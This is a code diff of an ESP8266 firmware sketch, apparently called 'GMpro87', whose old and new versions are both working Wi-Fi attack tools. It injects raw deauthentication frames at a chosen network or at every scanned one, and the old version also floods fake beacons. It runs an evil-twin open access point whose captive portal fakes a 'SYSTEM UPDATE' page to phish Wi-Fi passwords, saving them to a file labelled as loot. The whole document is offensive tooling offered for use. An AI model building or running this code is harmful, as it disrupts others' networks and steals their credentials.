@@ -1,215 +1,274 @@
 #include <ESP8266WiFi.h>
-#include <ESP8266WebServer.h>
 #include <DNSServer.h>
-#include <FS.h>
+#include <ESP8266WebServer.h>
 #include <LittleFS.h>
 
-// --- Definisi Internal untuk Packet Injection ---
 extern "C" {
-  #include "user_interface.h"
-  typedef void (*freedom_outside_cb_t)(uint8_t status);
-  int wifi_send_pkt_freedom(uint8_t *buf, int len, bool sys_seq);
+#include "user_interface.h"
+  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
 }
 
-// --- Struktur Data & Variabel Global ---
-struct Target {
-  String ssid = "";
+/* ===========================================
+   KONFIGURASI & VARIABEL SISTEM
+   =========================================== */
+const char AP_SSID_DEFAULT[] = "GMpro87";
+const char AP_PASS_DEFAULT[] = "9u5M4n9_88";
+
+bool massDeauthActive = false;
+bool targetDeauthActive = false;
+bool beaconSpamActive = false;
+bool evilTwinActive = false;
+
+struct Network {
+  String ssid;
+  uint8_t ch;
   uint8_t bssid[6];
-  int ch = 1;
+  String bssidStr;
 };
 
-Target target;
+Network networks[30]; // Kapasitas scan 30 network
+int networkCount = 0;
+Network selectedNet;
+
 ESP8266WebServer server(80);
 DNSServer dnsServer;
+String logs = "System Ready. Welcome GMpro87...<br>";
+unsigned long lastActionTime = 0;
 
-String logs = "GMpro87 System Ready...";
-bool attack_deauth = false;
-bool attack_mass_deauth = false;
-bool attack_spam = false;
-bool attack_evil = false;
+/* ===========================================
+   FRONTEND (HTML CSS ASLI TANPA PERUBAHAN)
+   =========================================== */
+const char INDEX_HTML[] PROGMEM = R"=====(
+<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>
+<style>
+:root{--c:#00f2ff;--r:#ff3e3e;--g:#00ff9d;--bg:#050505;--card:#111;}
+*{margin:0;padding:0;box-sizing:border-box;font-family:monospace;}
+body{background:var(--bg);color:#eee;padding:10px;}
+.header{text-align:center;margin-bottom:15px;border-bottom:1px solid #222;padding-bottom:10px;}
+.header h1{color:var(--c);font-size:1.3rem;letter-spacing:2px;}
+.header p{font-size:0.7rem;color:#666;}
+.tabs{display:flex;gap:5px;margin-bottom:15px;}
+.tab-btn{flex:1;padding:10px;background:#1a1a1a;border:1px solid #333;color:#888;cursor:pointer;font-size:0.7rem;}
+.tab-btn.active{border-bottom:2px solid var(--c);color:var(--c);background:#222;}
+.content{display:none;} .content.active{display:block;}
+.card{background:var(--card);border:1px solid #222;padding:12px;border-radius:8px;margin-bottom:10px;}
+h3{color:var(--c);font-size:0.7rem;margin-bottom:8px;text-transform:uppercase;border-left:3px solid var(--c);padding-left:8px;}
+.btn{width:100%;padding:12px;margin:4px 0;background:#1a1a1a;border:1px solid #444;color:#fff;font-weight:bold;cursor:pointer;border-radius:4px;font-size:0.8rem;transition:0.3s;}
+.btn.active{background:var(--c);color:#000;box-shadow:0 0 15px var(--c);border-color:var(--c);}
+.log-box{background:#000;height:120px;overflow-y:auto;padding:8px;font-size:10px;color:var(--g);border:1px solid #222;}
+table{width:100%;font-size:10px;border-collapse:collapse;} 
+th{color:#666;text-align:left;padding:5px;border-bottom:1px solid #333;}
+td{padding:8px 5px;border-bottom:1px solid #1a1a1a;}
+.sel-btn{background:var(--c);color:#000;border:none;padding:3px 6px;border-radius:2px;font-weight:bold;}
+input, select{width:100%;padding:10px;background:#1a1a1a;color:#fff;border:1px solid #444;margin:5px 0;font-family:monospace;}
+</style></head><body>
+<div class='header'><h1>GMpro87</h1><p>(by : 9u5M4n9)</p></div>
+<div class='tabs'>
+<button class='tab-btn active' onclick="opTab(event,'atk')">ATTACK</button>
+<button class='tab-btn' onclick="opTab(event,'fil')">FILES</button>
+<button class='tab-btn' onclick="opTab(event,'set')">SET</button>
+</div>
+<div id='atk' class='content active'>
+<div class='card'><h3>Log Dashboard</h3><div class='log-box' id='logs'>Ready...</div></div>
+<div class='card'><h3>Attack Engine</h3>
+<button id='kill' class='btn' onclick="tg('kill')">MASS DEAUTH</button>
+<button id='deauth' class='btn' onclick="tg('deauth')">TARGET DEAUTH</button>
+<button id='spam' class='btn' onclick="tg('spam')">BEACON SPAM</button>
+<button id='evil' class='btn' onclick="tg('evil')">EVIL TWIN</button></div>
+<div class='card'><h3>WiFi Scanner</h3><button class='btn' onclick='scan()'>SCAN</button>
+<table><thead><tr><th>SSID</th><th>CH</th><th>SIG</th><th>ACT</th></tr></thead><tbody id='list'></tbody></table></div>
+</div>
+<div id='fil' class='content'>
+<div class='card'><h3>Upload Page</h3><input type='file' id='f' multiple><button class='btn' onclick='up()'>UPLOAD FILES</button></div>
+<div class='card'><h3>Captured Loot</h3><div class='log-box' id='loot' style='color:#ffc107'></div><button class='btn' onclick='ldLoot()'>REFRESH LOOT</button></div>
+</div>
+<div id='set' class='content'>
+<div class='card'><h3>Beacon Spam Config</h3><input type='number' id='bN' placeholder='Jumlah Clone'><button class='btn' onclick='stSpam()'>SET AMOUNT</button></div>
+<div class='card'><h3>Evil Twin Selector</h3><select id='etS'><option value='/etwin1.html'>etwin1.html</option><option value='/etwin2.html'>etwin2.html</option><option value='/etwin3.html'>etwin3.html</option><option value='/etwin4.html'>etwin4.html</option><option value='/etwin5.html'>etwin5.html</option></select><button class='btn' onclick='setEt()'>SET ACTIVE PAGE</button></div>
+<div class='card'><h3>AP Settings</h3><input type='text' id='aS' placeholder='SSID'><input type='text' id='aP' placeholder='PASS'><button class='btn' onclick='save()'>SAVE & REBOOT</button></div>
+</div>
+<script>
+function opTab(e,n){var i,c,t;c=document.getElementsByClassName('content');for(i=0;i<c.length;i++)c[i].style.display='none';
+t=document.getElementsByClassName('tab-btn');for(i=0;i<t.length;i++)t[i].className=t[i].className.replace(' active','');
+document.getElementById(n).style.display='block';e.currentTarget.className+=' active';}
+function scan(){fetch('/scan').then(r=>r.json()).then(data=>{let h='';data.forEach(n=>{h+='<tr><td>'+(n.s||'[HIDDEN]')+'</td><td>'+n.c+'</td><td>'+n.r+'%</td><td><button class="sel-btn" onclick="sel(\''+n.b+'\',\''+n.s+'\','+n.c+')">SEL</button></td></tr>';});document.getElementById('list').innerHTML=h;});}
+function sel(b,s,c){fetch('/select?b='+b+'&s='+s+'&c='+c).then(()=>alert('Target Locked: '+s));}
+function tg(m){fetch('/toggle?m='+m).then(r=>r.text()).then(st=>{let b=document.getElementById(m);if(st.trim()=="ON")b.classList.add('active');else b.classList.remove('active');});}
+function up(){var files=document.getElementById('f').files;for(var i=0;i<files.length;i++){var d=new FormData();d.append('file',files[i],"/"+files[i].name);fetch('/upload',{method:'POST',body:d});}alert('Upload Done!');}
+function ldLoot(){fetch('/pass.txt').then(r=>r.text()).then(t=>document.getElementById('loot').innerText=t);}
+function chk(){fetch('/status').then(r=>r.json()).then(s=>{if(s.k)document.getElementById('kill').classList.add('active');if(s.d)document.getElementById('deauth').classList.add('active');if(s.s)document.getElementById('spam').classList.add('active');if(s.e)document.getElementById('evil').classList.add('active');});}
+window.onload=chk;
+setInterval(function(){fetch('/getlogs').then(r=>r.text()).then(t=>{if(t.length>2){var l=document.getElementById('logs');l.innerHTML+=t;l.scrollTop=l.scrollHeight;}});},1500);
+</script></body></html>
+)=====";
 
-int beacon_count = 15;
-int current_hop_channel = 1;
-unsigned long last_attack_time = 0;
-unsigned long last_hop_time = 0;
+/* ===========================================
+   LOGIKA INJEKSI PAKET (RAW)
+   =========================================== */
 
-// --- Fungsi Log ---
-void addLog(String msg) {
-  logs = "[" + String(millis()/1000) + "s] " + msg + "\n" + logs;
-  if(logs.length() > 3000) logs = logs.substring(0, 3000); 
-}
-
-// --- Fungsi Kirim Paket Deauth (Raw) ---
-void sendDeauthPacket(uint8_t* bssid, uint8_t ch) {
-  uint8_t deauthPkg[26] = {
+void sendDeauthPacket(uint8_t* bssid) {
+  uint8_t packet[26] = {
     0xC0, 0x00, 0x3A, 0x01, 
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver: Broadcast
-    0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver (Broadcast)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Target BSSID)
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
-    0x00, 0x00, 0x01, 0x00
+    0x00, 0x00, 0x01, 0x00              // Reason code
   };
-  memcpy(&deauthPkg[10], bssid, 6);
-  memcpy(&deauthPkg[16], bssid, 6);
-
-  wifi_set_channel(ch);
-  wifi_send_pkt_freedom(deauthPkg, 26, 0);
+  memcpy(&packet[10], bssid, 6);
+  memcpy(&packet[16], bssid, 6);
+  wifi_send_pkt_freedom(packet, 26, 0);
 }
 
-// --- Fungsi Beacon Spam ---
-void sendBeaconSpam() {
-  if (target.ssid == "") return;
-  for (int i = 0; i < beacon_count; i++) {
-    uint8_t mac[6];
-    for (int j = 0; j < 6; j++) mac[j] = random(256);
-    mac[5] = i;
-
-    uint8_t packet[128];
-    int len = 0;
-    uint8_t header[] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
-    memcpy(packet, header, 10);
-    memcpy(&packet[10], mac, 6); 
-    memcpy(&packet[16], mac, 6);
-    len += 22;
-    packet[len++] = 0x00; packet[len++] = 0x00;
-    uint8_t fixed[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x11, 0x04 };
-    memcpy(&packet[len], fixed, 12);
-    len += 12;
-    packet[len++] = 0x00; 
-    packet[len++] = target.ssid.length();
-    for (int s = 0; s < target.ssid.length(); s++) packet[len++] = target.ssid[s];
-    uint8_t rates[] = { 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, (uint8_t)target.ch };
-    memcpy(&packet[len], rates, 13);
-    len += 13;
-
-    wifi_set_channel(target.ch);
-    wifi_send_pkt_freedom(packet, len, 0);
-    delay(1);
+void parseMac(String macStr, uint8_t* macBytes) {
+  for (int i = 0; i < 6; i++) {
+    macBytes[i] = strtoul(macStr.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
   }
 }
 
-// --- Dashboard UI ---
-void handleRoot() {
-  String s = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style>";
-  s += "body{background:#000;color:#0f0;font-family:monospace;padding:15px;margin:0;}";
-  s += ".box{border:1px solid #0f0;padding:15px;border-radius:5px;box-shadow:0 0 10px #0f02;}";
-  s += "h2{text-align:center;color:#fff;text-shadow:0 0 5px #0f0;margin-top:0;}";
-  s += ".info{background:#111;padding:10px;border-left:3px solid #f00;margin-bottom:15px;font-size:12px;}";
-  s += ".btn-group{display:grid;grid-template-columns:1fr 1fr;gap:10px;}";
-  s += ".btn{background:#000;color:#0f0;border:1px solid #0f0;padding:12px;cursor:pointer;font-weight:bold;text-transform:uppercase;font-size:11px;}";
-  s += ".btn:active{background:#0f0;color:#000;}";
-  s += ".active{background:#f00 !important;color:#fff !important;border-color:#f00 !important;box-shadow:0 0 10px #f00;}";
-  s += ".scan-btn{grid-column:span 2;background:#0f0;color:#000;margin-bottom:5px;}";
-  s += "pre{background:#050505;padding:10px;height:220px;overflow:auto;border:1px inset #0f0;font-size:11px;margin-top:15px;white-space:pre-wrap;}";
-  s += "a{color:#0f0;text-decoration:none;font-weight:bold;border:1px solid #0f0;padding:0 3px;margin-right:5px;}";
-  s += "</style></head><body>";
+/* ===========================================
+   SERVER HANDLERS
+   =========================================== */
 
-  s += "<div class='box'>";
-  s += "<h2>GMPRO87 v2.0</h2>";
-  s += "<div class='info'>";
-  s += "TARGET : " + (target.ssid == "" ? "--- NONE ---" : target.ssid) + "<br>";
-  s += "CHANNEL: " + (target.ssid == "" ? "-" : String(target.ch)) + "<br>";
-  s += "STATUS : " + String(attack_deauth || attack_mass_deauth || attack_spam || attack_evil ? "ATTACKING..." : "IDLE") + "</div>";
+void handleToggle() {
+  String mode = server.arg("m");
+  String state = "OFF";
 
-  s += "<div class='btn-group'>";
-  s += "<button class='btn scan-btn' onclick=\"location.href='/scan'\">RE-SCAN NETWORKS</button>";
-  s += "<button class='btn "+String(attack_deauth?"active":"")+"' onclick=\"fetch('/attack?type=deauth').then(()=>location.reload())\">DEAUTH TGT</button>";
-  s += "<button class='btn "+String(attack_mass_deauth?"active":"")+"' onclick=\"fetch('/attack?type=mass').then(()=>location.reload())\">MASS DEAUTH</button>";
-  s += "<button class='btn "+String(attack_spam?"active":"")+"' onclick=\"fetch('/attack?type=spam').then(()=>location.reload())\">BCN SPAM</button>";
-  s += "<button class='btn "+String(attack_evil?"active":"")+"' onclick=\"fetch('/attack?type=evil').then(()=>location.reload())\">EVIL TWIN</button>";
-  s += "</div>";
-
-  s += "<pre>" + logs + "</pre>";
-  s += "</div></body></html>";
-  server.send(200, "text/html", s);
+  if (mode == "kill") {
+    massDeauthActive = !massDeauthActive;
+    if (massDeauthActive) { state = "ON"; logs += "[!!!] MASS DEAUTH ACTIVE<br>"; }
+    else { logs += "[*] MASS DEAUTH STOPPED<br>"; }
+  }
+  else if (mode == "deauth") {
+    if (selectedNet.ssid == "") { logs += "Error: No target locked!<br>"; }
+    else {
+      targetDeauthActive = !targetDeauthActive;
+      if (targetDeauthActive) { state = "ON"; logs += "[!] DEAUTH: " + selectedNet.ssid + "<br>"; }
+      else { logs += "[*] TARGET DEAUTH STOPPED<br>"; }
+    }
+  }
+  else if (mode == "spam") {
+    beaconSpamActive = !beaconSpamActive;
+    state = beaconSpamActive ? "ON" : "OFF";
+    logs += beaconSpamActive ? "[!] BEACON SPAM START<br>" : "[*] SPAM STOPPED<br>";
+  }
+  else if (mode == "evil") {
+    evilTwinActive = !evilTwinActive;
+    if (evilTwinActive && selectedNet.ssid != "") {
+      state = "ON";
+      WiFi.softAP(selectedNet.ssid.c_str(), "");
+      logs += "[!] EVIL TWIN: " + selectedNet.ssid + "<br>";
+    } else {
+      WiFi.softAP(AP_SSID_DEFAULT, AP_PASS_DEFAULT);
+      evilTwinActive = false;
+      logs += "[*] EVIL TWIN STOPPED<br>";
+    }
+  }
+  server.send(200, "text/plain", state);
 }
 
 void setup() {
   Serial.begin(115200);
   LittleFS.begin();
-
-  WiFi.softAP("GMpro87_Admin", "password123");
-  addLog("AP Started: GMpro87_Admin");
-
-  server.on("/", handleRoot);
   
-  server.on("/scan", [](){
-    addLog("Scanning...");
+  WiFi.mode(WIFI_AP_STA);
+  wifi_promiscuous_enable(1);
+  WiFi.softAP(AP_SSID_DEFAULT, AP_PASS_DEFAULT);
+  
+  dnsServer.start(53, "*", WiFi.softAPIP());
+
+  server.on("/", []() { server.send(200, "text/html", INDEX_HTML); });
+  
+  server.on("/scan", []() {
     int n = WiFi.scanNetworks();
-    logs = ""; // Clear logs to show scan results
-    for (int i=0; i<n; i++) {
-      String s = WiFi.SSID(i);
-      String b = WiFi.BSSIDstr(i);
-      int c = WiFi.channel(i);
-      addLog("<a href='/set?ssid="+s+"&ch="+String(c)+"&bssid="+b+"'>[SEL]</a> "+s+" (CH "+String(c)+")");
+    networkCount = n;
+    String json = "[";
+    for (int i = 0; i < n; i++) {
+      networks[i].ssid = WiFi.SSID(i);
+      networks[i].ch = WiFi.channel(i);
+      networks[i].bssidStr = WiFi.BSSIDstr(i);
+      parseMac(networks[i].bssidStr, networks[i].bssid);
+
+      json += "{\"s\":\""+networks[i].ssid+"\",\"c\":"+String(networks[i].ch)+",\"r\":"+String(WiFi.RSSI(i)+100)+",\"b\":\""+networks[i].bssidStr+"\"}";
+      if (i < n - 1) json += ",";
     }
-    server.sendHeader("Location", "/");
-    server.send(302, "text/plain", "OK");
+    json += "]";
+    server.send(200, "application/json", json);
+    logs += "[*] Scan complete: " + String(n) + " found<br>";
   });
 
-  server.on("/set", [](){
-    target.ssid = server.arg("ssid");
-    target.ch = server.arg("ch").toInt();
-    String bssidStr = server.arg("bssid");
-    int values[6];
-    if (sscanf(bssidStr.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]) == 6) {
-      for (int i = 0; i < 6; ++i) target.bssid[i] = (uint8_t)values[i];
-    }
-    addLog("Target Set: " + target.ssid);
-    server.sendHeader("Location", "/");
-    server.send(302, "text/plain", "OK");
-  });
-
-  server.on("/attack", [](){
-    String t = server.arg("type");
-    if(t == "deauth") { attack_deauth = !attack_deauth; attack_mass_deauth = false; }
-    if(t == "mass")   { attack_mass_deauth = !attack_mass_deauth; attack_deauth = false; }
-    if(t == "spam")   { attack_spam = !attack_spam; }
-    if(t == "evil") {
-      attack_evil = !attack_evil;
-      if(attack_evil && target.ssid != "") {
-        WiFi.softAP(target.ssid.c_str());
-        dnsServer.start(53, "*", WiFi.softAPIP());
-      } else {
-        WiFi.softAP("GMpro87_Admin", "password123");
-        dnsServer.stop();
-      }
-    }
+  server.on("/select", []() {
+    selectedNet.ssid = server.arg("s");
+    selectedNet.ch = server.arg("c").toInt();
+    selectedNet.bssidStr = server.arg("b");
+    parseMac(selectedNet.bssidStr, selectedNet.bssid);
     server.send(200, "text/plain", "OK");
+  });
+
+  server.on("/toggle", handleToggle);
+  server.on("/getlogs", []() { server.send(200, "text/plain", logs); logs = ""; });
+  
+  server.on("/status", []() {
+    String json = "{\"k\":" + String(massDeauthActive) + ",\"d\":" + String(targetDeauthActive) + ",\"s\":" + String(beaconSpamActive) + ",\"e\":" + String(evilTwinActive) + "}";
+    server.send(200, "application/json", json);
+  });
+
+  server.on("/pass.txt", []() {
+    File f = LittleFS.open("/pass.txt", "r");
+    if (f) { server.streamFile(f, "text/plain"); f.close(); }
+    else server.send(200, "text/plain", "Empty...");
+  });
+
+  server.on("/upload", HTTP_POST, [](){ server.send(200); }, [](){
+    HTTPUpload& upload = server.upload();
+    if(upload.status == UPLOAD_FILE_START){
+      File f = LittleFS.open(upload.filename, "w"); f.close();
+    } else if(upload.status == UPLOAD_FILE_WRITE){
+      File f = LittleFS.open(upload.filename, "a"); f.write(upload.buf, upload.currentSize); f.close();
+    }
+  });
+
+  // Captive Portal Login Capture
+  server.onNotFound([]() {
+    String html = "<html><body style='background:#000;color:#00f2ff;font-family:monospace;padding:20px;text-align:center;'>";
+    html += "<h2>SYSTEM UPDATE</h2><p>Please re-enter WiFi Password to continue</p>";
+    html += "<form action='/login'><input name='pw' type='password' style='padding:10px;width:100%'><br><br>";
+    html += "<input type='submit' value='CONNECT' style='background:#00f2ff;padding:10px;width:100%'></form></body></html>";
+    server.send(200, "text/html", html);
+  });
+
+  server.on("/login", []() {
+    String pw = server.arg("pw");
+    File f = LittleFS.open("/pass.txt", "a");
+    f.println("Target: " + selectedNet.ssid + " | Pass: " + pw);
+    f.close();
+    logs += "<span style='color:var(--r)'>[!] PASSWORD CAPTURED: " + pw + "</span><br>";
+    server.send(200, "text/html", "Updating system... Please wait.");
   });
 
   server.begin();
 }
 
 void loop() {
+  dnsServer.processNextRequest();
   server.handleClient();
-  if(attack_evil) dnsServer.processNextRequest();
 
-  unsigned long currentMillis = millis();
+  unsigned long now = millis();
 
-  if (attack_deauth && target.ssid != "") {
-    if (currentMillis - last_attack_time > 100) {
-      sendDeauthPacket(target.bssid, target.ch);
-      last_attack_time = currentMillis;
-    }
+  // Logic Target Deauth
+  if (targetDeauthActive && (now - lastActionTime > 100)) {
+    wifi_set_channel(selectedNet.ch);
+    sendDeauthPacket(selectedNet.bssid);
+    lastActionTime = now;
   }
 
-  if (attack_mass_deauth) {
-    if (currentMillis - last_hop_time > 150) {
-      current_hop_channel++;
-      if (current_hop_channel > 13) current_hop_channel = 1;
-      wifi_set_channel(current_hop_channel);
-      last_hop_time = currentMillis;
-      uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-      sendDeauthPacket(broadcast, current_hop_channel);
+  // Logic Mass Deauth (Attack all scanned networks)
+  if (massDeauthActive && (now - lastActionTime > 150)) {
+    static int currentAtk = 0;
+    if (networkCount > 0) {
+      wifi_set_channel(networks[currentAtk].ch);
+      sendDeauthPacket(networks[currentAtk].bssid);
+      currentAtk = (currentAtk + 1) % networkCount;
     }
+    lastActionTime = now;
   }
-
-  if (attack_spam && target.ssid != "") {
-    static unsigned long lastS = 0;
-    if (currentMillis - lastS > 200) {
-      sendBeaconSpam();
-      lastS = currentMillis;
-    }
-  }
-  yield();
 }
